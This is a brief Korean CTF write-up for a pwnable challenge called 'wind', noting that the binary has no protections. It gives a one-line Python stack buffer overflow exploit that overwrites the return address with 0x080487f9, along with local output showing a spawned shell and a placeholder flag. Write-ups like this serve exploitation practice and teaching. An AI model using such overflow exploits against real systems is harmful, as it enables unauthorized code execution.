## No.5 Pwnable wind[100]

**점수:** 100

**분야:** Pwnable

**제목:** wind

**Description:**

> Capture the flag!
> 
> nc 223.194.105.182 22901
> Download : https://goo.gl/yTTyoJ

아무런 보호 메커니즘이 없는 BOF이다. 0x080487f9 번지로 뛰게끔 넉넉하게 오버플로우 시킨다.

대회 당시 미처 자료를 준비하지 못해 로컬에서 공격한 기록을 대신 남긴다.

```
$ (python -c "print '\xf9\x87\x04\x08'*200"; cat) | ./wind
Total 50 QUIZ
It's for my baby!
 
[+] LV1
[+] TYPING THIS: Z
[+] INPUT: �
[*] +1
/bin/sh: 1: : File name too long
cat flag
THIS IS THE FLAG
```
